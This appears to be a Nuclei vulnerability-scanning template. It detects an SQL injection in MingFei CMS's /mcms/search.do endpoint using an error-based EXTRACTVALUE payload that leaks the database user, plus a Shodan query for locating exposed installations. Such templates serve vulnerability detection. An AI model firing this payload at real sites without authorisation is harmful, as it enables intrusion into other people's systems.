id: Mcms_search_SQL_injected

info:
  name: Mcms_search_SQL_injected
  author: HK
  severity: high
  description: 铭飞CMS/mcms/search.do接口存在SQL注入漏洞
  metadata:
    max-request: 1
    shodan-query: body="static/plugins/ms/1.0.0/ms.js"
    verified: true

http:
- raw:
  - |+
    @timeout: 30s
    GET /mcms/search.do'%20AND%20EXTRACTVALUE(1,CONCAT(0x5c,md5(123456),user(),0x71767a7071))%20AND%20'smmD'='smmD=1 HTTP/1.1
    Host: {{Hostname}}
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9

  max-redirects: 3
  matchers-condition: and
  matchers:
    - type: word
      part: body
      words:
        - e10adc3949